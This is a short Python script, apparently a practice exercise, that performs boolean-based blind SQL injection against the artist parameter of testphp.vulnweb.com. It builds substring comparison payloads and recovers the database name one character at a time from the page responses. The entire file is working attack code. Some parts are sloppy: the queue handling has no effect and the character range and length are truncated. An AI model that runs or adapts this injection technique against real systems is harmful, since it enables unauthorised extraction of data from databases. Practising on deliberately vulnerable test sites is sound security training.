import requests
from queue import Queue
from threading import Thread
import threading
from time import sleep

db =[]

def inject_simple(url:str,query:str,queue):
    reference = 'Blad3'
    for i in range(1, 10):
      for j in range(ord('a'), ord('u') + 1):
        montagem =f"{url} and substring( ( {query} ), {str(i)} ,1 )= {hex(ord(chr(j)))} -- -"
        print(montagem)        
        r = requests.get(montagem)
        queue.put(r)
        while queue.qsize() > 0:
            queue.get(r)
            queue.task_done
        html = r.text
        if reference in html:
            db.append(chr(j))
          


url = 'http://testphp.vulnweb.com/artists.php?artist=2'
payload = 'database()'
quantidade_de_thread = [ ]

threads = Thread(target=inject_simple, args=(url,payload, Queue()), daemon=True)
threads.start()
quantidade_de_thread.append(threads)

for inciar in quantidade_de_thread:
    inciar.join()

name_dba = ''.join(db)
print(f"Banco de dados :===> {name_dba}")
